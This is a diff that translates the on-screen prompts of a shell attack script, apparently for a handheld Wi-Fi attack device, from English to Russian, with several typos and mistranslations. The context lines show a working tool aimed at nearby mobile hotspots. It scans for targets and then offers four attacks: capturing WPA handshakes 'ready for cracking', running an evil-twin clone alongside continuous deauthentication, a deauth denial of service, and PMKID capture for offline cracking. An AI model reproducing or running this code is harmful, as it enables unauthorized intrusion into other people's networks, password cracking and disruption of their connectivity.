@@ -12,18 +12,18 @@ nullsec_require_iface || exit 1
 LOOT_DIR="/mmc/nullsec/hotspots"
 mkdir -p "$LOOT_DIR"
 
-PROMPT "HOTSPOT HIJACK
+PROMPT "ПОХИЩЕНИЕ ХОТСПОТОВ
 
-Target mobile hotspots
-(phones, tablets, MiFi).
+Относитесь к мобильным hotspotам
+(телефоны, планшеты, MiFi).
 
-These often have weak
-passwords and valuable
-connected devices.
+У них часто слабые
+пароли и тысячи
+подключённых девайсов.
 
-Press OK to configure."
+Нажмите OK для конфигурирования."
 
-SPINNER_START "Scanning for hotspots..."
+SPINNER_START "Сканирование hotspotов..."
 timeout 15 airodump-ng $IFACE --write-interval 1 -w /tmp/hotscan --output-format csv 2>/dev/null
 SPINNER_STOP
 
@@ -33,55 +33,54 @@ grep -iE "iPhone|Android|Galaxy|Pixel|OnePlus|Hotspot|Mobile|MiFi|Jetpack|iPhone
 HOTSPOT_COUNT=$(wc -l < /tmp/hotspots.txt 2>/dev/null || echo 0)
 
 if [ "$HOTSPOT_COUNT" -eq 0 ]; then
-    PROMPT "NO HOTSPOTS FOUND
+    PROMPT "ХОТСПОТЫ НЕ НАЙДЕНЫ
 
-No mobile hotspots
-detected nearby.
+Mobile hotspotы близко не обнаружены.
 
-Try again later or
-scan longer.
+Попытайтесь позже или
+сканируйте дольше.
 
-Press OK to exit."
+Нажмите OK для выхода."
     exit 0
 fi
 
-PROMPT "FOUND $HOTSPOT_COUNT HOTSPOTS
+PROMPT "НАЙДЕНО $HOTSPOT_COUNT HOTSPOTОВ
 
-Select target by number
-on next screen."
+Выберите цель по номеру
+на следующем экране."
 
-TARGET_NUM=$(NUMBER_PICKER "Target # (1-$HOTSPOT_COUNT):" 1)
+TARGET_NUM=$(NUMBER_PICKER "Цель # (1-$HOTSPOT_COUNT):" 1)
 
 TARGET_LINE=$(sed -n "${TARGET_NUM}p" /tmp/hotspots.txt)
 BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
 CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
 SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')
 
-PROMPT "TARGET SELECTED
+PROMPT "ЦЕЛЬ ВЫБРАНА
 
 SSID: $SSID
 BSSID: $BSSID
-Channel: $CHANNEL
+Канал: $CHANNEL
 
-Select attack next."
+Выберите атаку."
 
-PROMPT "SELECT ATTACK:
+PROMPT "ВЫБОР АТАКИ:
 
-1. Capture handshake
-2. Evil twin clone
-3. Deauth disruption
-4. PMKID capture
+1. Захват handshake
+2. Evil twin-клон
+3. Нарушение deauth
+4. Перехват PMKID
 
-Enter number next."
+Введите номер."
 
-ATTACK=$(NUMBER_PICKER "Attack (1-4):" 1)
+ATTACK=$(NUMBER_PICKER "Атака (1-4):" 1)
 
-resp=$(CONFIRMATION_DIALOG "LAUNCH ATTACK?
+resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ АТАКУ?
 
-Target: $SSID
-Attack: $ATTACK
+Цель: $SSID
+Атака: $ATTACK
 
-Press OK to begin.")
+Нажмите OK для начала.")
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
 iwconfig $IFACE channel $CHANNEL
@@ -89,7 +88,7 @@ CAP_FILE="$LOOT_DIR/hotspot_${SSID}_$(date +%Y%m%d_%H%M)"
 
 case $ATTACK in
     1) # Handshake
-        LOG "Capturing handshake..."
+        LOG "Перехват handshake..."
         airodump-ng $IFACE --bssid "$BSSID" -c $CHANNEL -w "$CAP_FILE" &
         CAP_PID=$!
         sleep 3
@@ -105,21 +104,21 @@ case $ATTACK in
         kill $CAP_PID 2>/dev/null
         
         if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
-            PROMPT "HANDSHAKE CAPTURED!
+            PROMPT "ХЕНДШЕЙК ПЕРЕХВАЧЕН!
 
 SSID: $SSID
-File: ${CAP_FILE}.cap
+Файл: ${CAP_FILE}.cap
 
-Ready for cracking."
+Готов к взлому."
         else
-            PROMPT "NO HANDSHAKE
+            PROMPT "ХЕНДШЕйК НЕ ПЕРЕХВАЧЕН
 
-Could not capture.
-Try again."
+Не удалось перехватить.
+Попытайтесь еще."
         fi
         ;;
     2) # Evil twin
-        LOG "Starting evil twin..."
+        LOG "Начинаю evil twin..."
         cat > /tmp/twin.conf << EOF
 interface=$IFACE
 ssid=$SSID
@@ -131,42 +130,42 @@ EOF
         hostapd /tmp/twin.conf &
         aireplay-ng -0 0 -a "$BSSID" $IFACE &
         
-        PROMPT "EVIL TWIN ACTIVE
+        PROMPT "Отключающий твин АКТИВНОВ
 
-Clone of: $SSID
-Press OK to stop."
+Клон: $SSID
+Нажмите OK для остановки."
         
         killall hostapd aireplay-ng 2>/dev/null
         ;;
     3) # Deauth
-        LOG "Deauthing hotspot..."
+        LOG "Отключаю hotspot..."
         aireplay-ng -0 0 -a "$BSSID" $IFACE &
         
-        PROMPT "DEAUTH ACTIVE
+        PROMPT "ОТКЛЮЧЕНИЕ АКТИВНО
 
-Target: $SSID
-Press OK to stop."
+Цель: $SSID
+Нажмите OK для остановки."
         
         killall aireplay-ng 2>/dev/null
         ;;
     4) # PMKID
-        LOG "Capturing PMKID..."
+        LOG "Перехват PMKID..."
         timeout 30 hcxdumptool -i $IFACE -o "$CAP_FILE.pcapng" --filterlist_ap="$BSSID" --filtermode=2 2>/dev/null
         
         if [ -f "$CAP_FILE.pcapng" ]; then
             hcxpcapngtool -o "$CAP_FILE.hash" "$CAP_FILE.pcapng" 2>/dev/null
-            PROMPT "PMKID captured!
+            PROMPT "PMKID перехвачен!
 
-File: $CAP_FILE.hash"
+Файл: $CAP_FILE.hash"
         else
-            PROMPT "NO PMKID
+            PROMPT "Нет PMKID
 
-Target may not support."
+Цель может не поддерживать."
         fi
         ;;
 esac
 
-PROMPT "ATTACK COMPLETE
+PROMPT "АТАКА ЗАВЕрШЕНА
 
-Target: $SSID
-Press OK to exit."
+Цель: $SSID
+Нажмите OK для выхода."
